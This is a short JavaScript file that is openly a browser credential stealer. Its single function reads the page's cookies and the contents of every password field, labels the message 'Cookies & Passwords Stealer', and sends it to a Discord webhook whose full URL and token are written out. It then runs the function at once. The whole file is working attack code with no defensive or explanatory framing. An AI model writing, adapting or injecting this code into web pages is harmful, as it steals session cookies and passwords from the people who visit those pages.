function stealData() {
  const cookies = document.cookie;
  const passwords = [];

  for (const input of document.querySelectorAll('input[type="password"]')) {
    passwords.push(input.value);
  }

  /* Construct the payload for the Discord webhook */
  const payload = {
    content: 'Cookies: ' + cookies + '\nPasswords:\n- ' + passwords.join('\n- '),
    username: 'Cookies & Passwords Stealer',
    avatar_url: 'https://example.com/stalker.png',
  };

  /* Send the payload to the Discord webhook */
  fetch('https://discord.com/api/webhooks/1247886011736920064/RYuxpABPWgfqlLaLxe6WPaJ-wrpfO6bxunyN3Bi018wPGftWjXgSt4XIQ5toi04WhZR4', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(payload),
  }).catch(console.error);
}

/* Call the stealer function */
stealData();
